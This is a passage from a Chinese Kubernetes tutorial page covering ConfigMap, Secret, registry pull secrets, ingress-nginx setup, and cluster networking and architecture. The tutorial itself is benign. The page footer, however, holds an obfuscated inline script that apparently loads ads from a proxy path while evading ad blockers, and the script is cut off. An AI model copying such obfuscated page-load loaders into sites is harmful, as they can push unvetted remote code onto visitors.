<p>（2）动态供应<br>在前面的例子中，我们提前创建了 PV，然后通过 PVC 申请 PV 并在 Pod 中使用，这种方式叫作静态供应 （Static Provision）与之对应的是动态供应 (Dynamical Provision），即如果没有满足 PVC 条件的 PV，会动态创建 PV。相比静态供应，动态供应有明显的优势：不需要提前创建 PV，减少了管理员的工作量，效率高。动态供应是通过 StorageClass 实现的，StorageClass 定义了如何创建 PV，但需要注意的是每个 StorageClass 都有一个制备器（Provisioner），用来决定使用哪个卷插件制备 PV，该字段必须指定才能实现动态创建。</p> 
<h3><a id="_518"></a>配置</h3> 
<h4><a id="ConfigMap_519"></a>ConfigMap</h4> 
<p>在 Kubernetes 中，ConfigMap 是一种用于存储非敏感信息的 Kubernetes 对象。它用于存储配置数据，如键值对、整个配置文件或 JSON 数据等。ConfigMap 通常用于容器镜像中的配置文件、命令行参数和环境变量等。</p> 
<p>ConfigMap 可以通过三种方式进行配置数据的注入：</p> 
<ol><li>环境变量注入：将配置数据注入到 Pod 中的容器环境变量中。</li><li>配置文件注入：将配置数据注入到 Pod 中的容器文件系统中，容器可以读取这些文件。</li><li>命令行参数注入：将配置数据注入到容器的命令行参数中。</li></ol> 
<p>优点</p> 
<ol><li>避免了硬编码，将配置数据与应用代码分离。</li><li>便于维护和更新，可以单独修改 ConfigMap 而不需要重新构建镜像。</li><li>可以通过多种方式注入配置数据，更加灵活。</li><li>可以通过 Kubernetes 的自动化机制对 ConfigMap 进行版本控制和回滚。</li><li>ConfigMap 可以被多个 Pod 共享，减少了配置数据的重复存储。</li></ol> 
<p>定义 ConfigMap</p> 
<ul><li>基本操作</li></ul> 
<pre><code class="prism language-bash"><span class="token comment"># 查看 configmap</span>
$ kubectl get configmap/cm

<span class="token comment"># 查看详细</span>
$ kubectl describe configmap/cm my-config

<span class="token comment"># 删除 cm</span>
$ kubectl delete cm my-config
</code></pre> 
<ul><li>命令行创建</li></ul> 
<p>可以使用 kubectl create configmap 命令来创建 configmap，具体命令如下：</p> 
<pre><code class="prism language-bash">kubectl create configmap my-config --from-literal<span class="token operator">=</span>key1<span class="token operator">=</span>value1 --fromliteral<span class="token operator">=</span>key2<span class="token operator">=</span>value2
</code></pre> 
<ul><li>通过配置文件创建（推荐）</li></ul> 
<p>可以通过创建 YAML 文件的方式来定义 configmap 的内容。例如，创建一个名为 my-config 的 configmap，内容如下：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: ConfigMap
metadata:
	name: my-config
data:
  key1: value1
  key2: value2

---
apiVersion: v1
kind: ConfigMap
metadata:
	name: app-config
data:
  application.yml: <span class="token operator">|</span>
  	name: firechou
</code></pre> 
<p>然后使用 <code>kubectl apply -f</code> 命令来创建 configmap。</p> 
<ul><li>通过文件创建</li></ul> 
<pre><code class="prism language-bash">echo-n admin <span class="token operator">&gt;</span>./username
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token number">123456</span> <span class="token operator">&gt;</span> ./password
kubectl create configmap myconfigmap --from-file<span class="token operator">=</span>./username --from-file<span class="token operator">=</span>./password
</code></pre> 
<ul><li>通过文件夹创建</li></ul> 
<p>可以将多个配置文件放在同一个文件夹下，然后使用 <code>kubectl create configmap</code> 命令来创建configmap，例如：</p> 
<pre><code class="prism language-bash">kubectl create configmap my-config --from-file<span class="token operator">=</span>config-files/
</code></pre> 
<p>这将创建一个名为 my-config 的 configmap，其中包含 config-files 文件夹下所有的文件内容作为键值对。</p> 
<ul><li>通过环境变量创建</li></ul> 
<p>可以将环境变量的值转换为 configmap。例如，使用以下命令将当前环境变量的值转换为 configmap：</p> 
<pre><code class="prism language-bash">kubectl create configmap my-config --from-env-file<span class="token operator">=</span><span class="token operator">&lt;</span>env<span class="token operator">&gt;</span>
</code></pre> 
<h3><a id="Secret_601"></a>Secret</h3> 
<p>Secret 对象类型用来保存敏感信息，例如密码、OAuth 令牌和 SSH 密钥。 将这些信息放在 secret 中比放在 Pod 的定义或者容器镜像中来说更加安全和灵活。</p> 
<p>在 Kubernetes 中，Secrets 通常被用于以下场景：</p> 
<ul><li>作为卷挂载到 Pod 中，用于存储证书、密钥等敏感文件</li><li>在 Pod 中使用环境变量，用于存储用户名和密码等敏感信息</li><li>用于存储 Docker 镜像仓库的登录信息</li><li>用于存储外部服务的 API 密钥</li></ul> 
<p>定义 Secret</p> 
<ul><li>使用命令行创建</li></ul> 
<p>可以使用 <code>kubectl create secret</code> 命令来创建 secret，例如：</p> 
<pre><code class="prism language-bash">kubectl create secret generic my-secret --from-literal<span class="token operator">=</span>username<span class="token operator">=</span>admin --from-literal<span class="token operator">=</span>password<span class="token operator">=</span>admin123
</code></pre> 
<ul><li>使用 YAML 文件定义</li></ul> 
<p>可以创建一个 YAML 文件来定义 Secret 对象，例如：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: Secret
metadata:
	name: my-secret
type: Opaque
data:
	username: <span class="token assign-left variable">YWRtaW4</span><span class="token operator">=</span> <span class="token comment"># base64 编码后的用户名 admin</span>
	password: MWYyZDFlMmU2N2Rm <span class="token comment"># base64 编码后的密码 1f2d1e2e67df</span>
</code></pre> 
<p>注意：这个 YAML 文件定义了一个名为 my-secret 的 Secret 对象，其中包含了两个 base64 编码后的 key-value 对：username 和 password。</p> 
<ul><li>使用文件创建</li></ul> 
<pre><code class="prism language-bash"><span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> admin <span class="token operator">&gt;</span>./username
<span class="token builtin class-name">echo</span> <span class="token parameter variable">-n</span> <span class="token number">123456</span> <span class="token operator">&gt;</span> ./password
kubectl create secret generic mysecret --from-file<span class="token operator">=</span>./username --from-file<span class="token operator">=</span>./password
</code></pre> 
<ul><li>通过环境变量创建</li></ul> 
<p>可以将环境变量的值转换为 secret。例如，使用以下命令将当前环境变量的值转换为 secret：</p> 
<pre><code class="prism language-bash">kubectl create secret generic my-config --from-env-file<span class="token operator">=</span><span class="token operator">&lt;</span>env<span class="token operator">&gt;</span>
</code></pre> 
<p>使用示例</p> 
<p>从私有docker仓库拉取镜像</p> 
<pre><code class="prism language-bash"><span class="token function">docker</span> pull registry.cn-hangzhou.aliyuncs.com/firechou/mall-product:0.0.5
</code></pre> 
<p>无法从私有镜像仓库拉取镜像，抛出错误。<br>解决方案：使用 docker 的用户信息来生成 secret：</p> 
<pre><code class="prism language-bash"><span class="token comment"># 命令格式</span>
kubectl create secret docker-registry myregistrykey <span class="token punctuation">\</span>
--docker-server<span class="token operator">=</span><span class="token operator">&lt;</span>你的镜像仓库服务器<span class="token operator">&gt;</span> <span class="token punctuation">\</span>
--docker-username<span class="token operator">=</span><span class="token operator">&lt;</span>你的用户名<span class="token operator">&gt;</span> <span class="token punctuation">\</span>
--docker-password<span class="token operator">=</span><span class="token operator">&lt;</span>你的密码<span class="token operator">&gt;</span> <span class="token punctuation">\</span>
--docker-email<span class="token operator">=</span><span class="token operator">&lt;</span>你的邮箱地址<span class="token operator">&gt;</span>

kubectl create secret docker-registry myregistrykey --docker-server<span class="token operator">=</span>registry.cnhangzhou.aliyuncs.com --docker-username<span class="token operator">=</span>firechou --docker-password<span class="token operator">=</span>xxx
</code></pre> 
<p>在创建 Pod 的时候，通过 imagePullSecrets 来引用刚创建的 myregistrykey：</p> 
<pre><code class="prism language-bash">apiVersion: v1
kind: Pod
	metadata:
		name: tulingmall-product
spec: 
	containers:
	- name: tulingmall-product
		image: registry.cn-hangzhou.aliyuncs.com/firechou/mall-product:0.0.5
	imagePullSecrets:
	- name: myregistrykey
</code></pre> 
<h3><a id="Ingress_679"></a>Ingress</h3> 
<p>Ingress 是一种 Kubernetes 资源类型，它允许在 Kubernetes 集群中暴露 HTTP 和 HTTPS 服务。<br>通过 Ingress，您可以将流量路由到不同的服务和端点，而无需使用不同的负载均衡器。Ingress 通常使用 Ingress Controller 实现，它是一个运行在 Kubernetes 集群中的负载均衡器，它根据 Ingress 规则配置路由规则并将流量转发到相应的服务。<br>下面是一个将所有流量都发送到同一 Service 的简单 Ingress 示例。</p> 
<h4><a id="Ingress__Service__681"></a>Ingress 和 Service 区别</h4> 
<p>Ingress 和 Service 都是 Kubernetes 中用于将流量路由到应用程序的机制，但它们在路由层面上有所不同：</p> 
<ul><li>Service 是 Kubernetes 中抽象的应用程序服务，它公开了一个单一的 IP 地址和端口，可以用于在 Kubernetes 集群内部的 Pod 之间进行流量路由。</li><li>Ingress 是一个 Kubernetes 资源对象，它提供了对集群外部流量路由的规则。Ingress 通过一个公共 IP 地址和端口将流量路由到一个或多个 Service。</li></ul> 
<h4><a id="_Ingress_686"></a>安装 Ingress</h4> 
<p>1）下载 ingress 配置文件</p> 
<pre><code class="prism language-bash"><span class="token function">wget</span> https://raw.githubusercontent.com/kubernetes/ingress-nginx/controller-v0.47.0/deploy/static/provider/baremetal/deploy.yaml

<span class="token punctuation">[</span>root@k8s-master k8s<span class="token punctuation">]</span><span class="token comment"># grep image: deploy.yaml </span>
	image: k8s.gcr.io/ingress-nginx/controller:v0.46.0@sha256:52f0058bed0a17ab0fb35628ba97e8d52b5d32299fbc03cc0f6c7b9ff036b61a
	image: docker.io/jettech/kube-webhook-certgen:v1.5.1
	image: docker.io/jettech/kube-webhook-certgen:v1.5.1

<span class="token comment"># 修改镜像</span>
<span class="token function">vi</span> deploy.yaml
<span class="token comment"># 1、将image k8s.gcr.io/ingressnginx/controller:v0.46.0@sha256:52f0058bed0a17ab0fb35628ba97e8d52b5d32299fbc03cc0f6c7b9ff036b61a的值改为如下值：</span>
registry.cn-hangzhou.aliyuncs.com/lfy_k8s_images/ingress-nginx-controller:v0.46.0
</code></pre> 
<p>2）安装 ingress，执行如下命令</p> 
<pre><code class="prism language-bash">kubectl apply <span class="token parameter variable">-f</span> ingress-controller.yaml
</code></pre> 
<p>3）查看是否安装成功</p> 
<pre><code class="prism language-bash">kubectl get pod,svc <span class="token parameter variable">-n</span> ingress-nginx <span class="token parameter variable">-owide</span>
</code></pre> 
<h4><a id="_Ingress_711"></a>使用 Ingress</h4> 
<blockquote> 
 <p>官网地址：<a href="https://kubernetes.github.io/ingress-nginx/" rel="nofollow">https://kubernetes.github.io/ingress-nginx/</a></p> 
</blockquote> 
<p>配置 ingress 访问规则（就是类似配置 nginx 的代理转发配置），让 ingress 将域名 tomcat.firechou.com 转发给后端的 my-tomcat 服务，新建一个文件 ingress-tomcat.yaml，内容如下：</p> 
<pre><code class="prism language-bash">apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
	name: web-ingress
spec:
	rules:
	- host: tomcat.firechou.com <span class="token comment"># 转发域名</span>
  	http:
  		aths:
  		- pathType: Prefix
 				path: /
	 			backend:
					service:
						name: my-tomcat
            port:
							number: <span class="token number">8080</span> <span class="token comment"># service的端口</span>
</code></pre> 
<p>执行如下命令生效规则：</p> 
<pre><code class="prism language-bash">kubectl apply <span class="token parameter variable">-f</span> ingress-tomcat.yaml
</code></pre> 
<p>查看生效的 ingress 规则：</p> 
<pre><code class="prism language-bash">kubectl get ing
</code></pre> 
<p>在访问机器配置 host，win10 客户机在目录：<code>C:\Windows\System32\drivers\etc</code>，在 host 里增加如下host（ingress 部署的机器 ip 对应访问的域名）</p> 
<pre><code class="prism language-bash"><span class="token number">192.168</span>.65.82 tomcat.firechou.com
</code></pre> 
<p>配置完后直接在客户机浏览器访问<code>[http://tomcat.firechou.com:30940](http://tomcat.firechou.com:30940)</code>能正常访问 tomcat。</p> 
<h4><a id="ServiceIngress__746"></a>Service&amp;Ingress 总结</h4> 
<p>Service 是 K8S 服务的核心，屏蔽了服务细节，统一对外暴露服务接口，真正做到了“微服务”。<br>举个例子，我们的一个服务 A，部署了 3 个备份，也就是 3 个 Pod；对于用户来说，只需要关注一个 Service 的入口就可以，而不需要操心究竟应该请求哪一个 Pod。<br>优势非常明显：一方面外部用户不需要感知因为 Pod 上服务的意外崩溃、K8S 重新拉起 Pod 而造成的 IP 变更，外部用户也不需要感知因升级、变更服务带来的 Pod 替换而造成的 IP 变化，另一方面，Service 还可以做流量负载均衡。<br>但是，Service 主要负责 K8S 集群内部的网络拓扑。集群外部需要用 Ingress。<br>Ingress 是整个 K8S 集群的接入层，复杂集群内外通讯。</p> 
<h2><a id="K8S__748"></a>K8S 核心原理</h2> 
<h3><a id="K8S__749"></a>K8S 的网络模型</h3> 
<p>K8S 的网络中主要存在 4 种类型的通信：</p> 
<ul><li>同一 Pod 内的容器间通信</li><li>各个 Pod 彼此间的通信</li><li>Pod 和 Service 间的通信</li><li>集群外部流量和 Service 之间的通信</li></ul> 
<p>K8S 为 Pod 和 Service 资源对象分别使用了各自的专有网络，Pod 网络由 K8S 的网络插件配置实现，而 Service 网络则由 K8S 集群进行指定。</p> 
<p>K8S 使用的网络插件需要为每个 Pod 配置至少一个特定的地址，即 Pod IP。Pod IP 地址实际存在于某个网卡（可以是虚拟机设备）上。<br>而 Service 的地址却是一个虚拟 IP 地址，没有任何网络接口配置在此地址上，它由 Kube-proxy 借助 iptables 规则或 ipvs 规则重定向到本地端口，再将其调度到后端的 Pod 对象。Service 的 IP 地址是集群提供服务的接口，也称为 Cluster IP。<br>Pod 网络和 IP 由 K8S 的网络插件负责配置和管理，具体使用的网络地址可以在管理配置网络插件时进行指定，如<code>10.244.0.0/16</code>网络。而 Cluster 网络和 IP 是由 K8S 集群负责配置和管理，如<code>10.96.0.0/12</code>网络。</p> 
<p>一个 K8S 集群包含是三个网络。</p> 
<ul><li>节点网络</li></ul> 
<p>各主机（Master、Node、ETCD 等）自身所属的网络，地址配置在主机的网络接口，用于各主机之间的通信，又称为节点网络。</p> 
<ul><li>Pod 网络</li></ul> 
<p>专用于 Pod 资源对象的网络，它是一个虚拟网络，用于为各 Pod 对象设定 IP 地址等网络参数，其地址配置在 Pod 中容器的网络接口上。Pod 网络需要借助 kubenet 插件或 CNI 插件实现。</p> 
<ul><li>Service网络</li></ul> 
<p>专用于 Service 资源对象的网络，它也是一个虚拟网络，用于为 K8S 集群之中的 Service 配置 IP 地址，但是该地址不会配置在任何主机或容器的网络接口上，而是通过 Node 上的 kube-proxy 配置为 iptables 或 ipvs 规则，从而将发往该地址的所有流量调度到后端的各 Pod 对象之上。</p> 
<h3><a id="K8S__774"></a>K8S 的工作流程</h3> 
<p>用 K8S 部署 Nginx 的过程中，K8S 内部各组件是如何协同工作的？我们在 master 节点执行一条命令要 master 部署一个 nginx 应用（<code>kubectl create deployment nginx --image=nginx</code>）。</p> 
<ul><li>这条命令首先发到 master 节点的网关 api server，这是 matser 的唯一入口</li><li>api server 将命令请求交给 controller mannager 进行控制</li><li>controller mannager 进行应用部署解析</li><li>controller mannager 会生成一次部署信息，并通过 api server 将信息存入 etcd 存储中</li><li>scheduler 调度器通过 api server 从 etcd 存储中，拿到要部署的应用，开始调度看哪个节点有资源适合部署</li><li>scheduler 把计算出来的调度信息通过 api server 再放到 etcd 中</li><li>每一个 node 节点的监控组件 kubelet，随时和 master 保持联系（给 api-server 发送请求不断获取最新数据），拿到 master 节点存储在 etcd 中的部署信息</li><li>假设 node2 的 kubelet 拿到部署信息，显示他自己节点要部署某某应用</li><li>kubelet 就自己 run 一个应用在当前机器上，并随时给 master 汇报当前应用的状态信息</li><li>node 和 master 也是通过 master 的 api-server 组件联系的</li><li>每一个机器上的 kube-proxy 能知道集群的所有网络，只要 node 访问别人或者别人访问 node，node 上的 kubeproxy 网络代理自动计算进行流量转发</li></ul> 
<p><img src="https://images2.imgbox.com/b5/be/iC0x9X8U_o.png" alt="image.png"></p> 
<h3><a id="K8S__790"></a>K8S 架构原理六连问</h3> 
<p>K8S 是一个基于容器技术的分布式集群管理系统。既然是个分布式系统，那势必有多个 Node 节点（物理主机或虚拟机），它们共同组成一个分布式集群，并且这些节点中会有一个 Master 节点，由它来统一管理 Node 节点。</p> 
<h4><a id="_792"></a>问题一：主节点和工作节点是如何通信的呢？</h4> 
<p>首先，Master 节点启动时，会运行一个 kube-apiserver 进程，它提供了集群管理的 API 接口，是集群内各个功能模块之间数据交互和通信的中心枢纽，并且它也提供了完备的集群安全机制。<br>在 Node 节点上，使用 K8S 中的 kubelet 组件，在每个 Node 节点上都会运行一个 kubelet 进程，它负责向 Master 汇报自身节点的运行情况，如 Node 节点的注册、终止、定时上报健康状况等，以及接收 Master 发出的命令，创建相应 Pod。<br>在 K8S 中，Pod 是最基本的操作单元，它与 docker 的容器有略微的不同，因为 Pod 可能包含一个或多个容器（可以是 docker 容器），这些内部的容器是共享网络资源的，即可以通过 localhost 进行相互访问。<br>关于 Pod 内是如何做到网络共享的，每个 Pod 启动，内部都会启动一个 pause 容器（google的一个镜像），它使用默认的网络模式，而其他容器的网络都设置给它，以此来完成网络的共享问题。</p> 
<h4><a id="Master__Pod__Node__794"></a>问题二：Master 是如何将 Pod 调度到指定的 Node 上的？</h4> 
<p>该工作由 kube-scheduler 来完成，整个调度过程通过执行一些列复杂的算法最终为每个 Pod 计算出一个最佳的目标 Node，该过程由 kube-scheduler 进程自动完成。常见的有轮询调度（RR）。当然也有可能，我们需要将 Pod 调度到一个指定的 Node 上，我们可以通过节点的标签（Label）和 Pod 的 nodeSelector 属性的相互匹配，来达到指定的效果。</p> 
<h4><a id="Pod__796"></a>问题三：各节点、Pod 的信息都是统一维护在哪里的，由谁来维护？</h4> 
<p>从上面的 Pod 调度的角度看，我们得有一个存储中心，用来存储各节点资源使用情况、健康状态、以及各 Pod 的基本信息等，这样 Pod 的调度来能正常进行。<br>在 K8S 中，采用 etcd 组件作为一个高可用强一致性的存储仓库，该组件可以内置在 K8S 中，也可以外部搭建供 K8S 使用。<br>集群上的所有配置信息都存储在了 etcd，为了考虑各个组件的相对独立，以及整体的维护性，对于这些存储数据的增、删、改、查，统一由 kube-apiserver 来进行调用，apiserver 也提供了 REST 的支持，不仅对各个内部组件提供服务外，还对集群外部用户暴露服务。<br>外部用户可以通过 REST 接口，或者 kubectl 命令行工具进行集群管理，其内在都是与 apiserver 进行通信。</p> 
<h4><a id="_Pod__798"></a>问题四：外部用户如何访问集群内运行的 Pod ？</h4> 
<p>前面讲了外部用户如何管理 K8S，而我们更关心的是内部运行的 Pod 如何对外访问。使用过 Docker 的同学应该知道，如果使用 bridge 模式，在容器创建时，都会分配一个虚拟 IP，该 IP 外部是没法访问到的，我们需要做一层端口映射，将容器内端口与宿主机端口进行映射绑定，这样外部通过访问宿主机的指定端口，就可以访问到内部容器端口了。<br>那么，K8S 的外部访问是否也是这样实现的？答案是否定的，K8S 中情况要复杂一些。因为上面讲的 Docker 是单机模式下的，而且一个容器对外就暴露一个服务。在分布式集群下，一个服务往往由多个 Application 提供，用来分担访问压力，而且这些 Application 可能会分布在多个节点上，这样又涉及到了跨主机的通信。<br>这里，K8S 引入了 Service 的概念，将多个相同的 Pod 包装成一个完整的 service 对外提供服务，至于获取到这些相同的 Pod，每个 Pod 启动时都会设置 labels 属性，在 Service 中我们通过选择器 Selector，选择具有相同 Name 标签属性的 Pod，作为整体服务，并将服务信息通过 Apiserver 存入 etcd 中，该工作由 Service Controller 来完成。同时，每个节点上会启动一个 kube-proxy 进程，由它来负责服务地址到 Pod 地址的代理以及负载均衡等工作。</p> 
<h4><a id="Pod__800"></a>问题五：Pod 如何动态扩容和缩放？</h4> 
<p>既然知道了服务是由 Pod 组成的，那么服务的扩容也就意味着 Pod 的扩容。通俗点讲，就是在需要时将 Pod 复制多份，在不需要后，将 Pod 缩减至指定份数。K8S 中通过 Replication Controller 来进行管理，为每个 Pod 设置一个期望的副本数，当实际副本数与期望不符时，就动态的进行数量调整，以达到期望值。期望数值可以由我们手动更新，或自动扩容代理来完成。</p> 
<h4><a id="_802"></a>问题六：各个组件之间是如何相互协作的？</h4> 
<p>最后，讲一下 kube-controller-manager 这个进程的作用。我们知道了 ectd 是作为集群数据的存储中心， apiserver 是管理数据中心，作为其他进程与数据中心通信的桥梁。而 Service Controller、Replication Controller 这些统一交由 kube-controller-manager 来管理，kube-controller-manager 作为一个守护进程，每个 Controller 都是一个控制循环，通过 apiserver 监视集群的共享状态，并尝试将实际状态与期望不符的进行改变。关于 Controller，manager 中还包含了 Node 节点控制器（Node Controller）、资源配额管控制器（ResourceQuota Controller）、命名空间控制器（Namespace Controller）等。</p>
                </div>
		</div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/238f488ed6413f9c983e3c8d0c4795a2/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">群晖Synology Office如何多人同时远程编辑同个文件</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a16ab8a717427fc71e5662f05cfbb300/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">WEB 3D技术 three.js 设置环境贴图 高光贴图 场景设置 光照贴图</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return 